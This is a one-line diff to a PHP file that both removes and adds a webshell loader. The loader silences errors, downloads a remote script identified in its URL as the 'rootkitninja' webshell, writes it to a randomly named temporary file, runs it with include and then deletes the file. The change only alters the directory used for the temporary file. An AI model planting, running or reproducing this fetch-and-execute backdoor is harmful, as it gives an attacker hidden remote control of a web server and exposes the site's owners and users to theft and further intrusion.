@@ -1,1 +1,1 @@
-<?php error_reporting(0);$x="https://raw.githubusercontent.com/ortod0x/rootkitninja_webshell/main/rootkitninja.php";$c=rand(1000,9999999);$y=__DIR__."$c.loader.rootkit.ninja";file_put_contents($y,file_get_contents($x));include($y);unlink($y); ?>
+<?php error_reporting(0);$x="https://raw.githubusercontent.com/ortod0x/rootkitninja_webshell/main/rootkitninja.php";$c=rand(1000,9999999);$y=getcwd()."$c.loader.rootkit.ninja";file_put_contents($y,file_get_contents($x));include($y);unlink($y); ?>
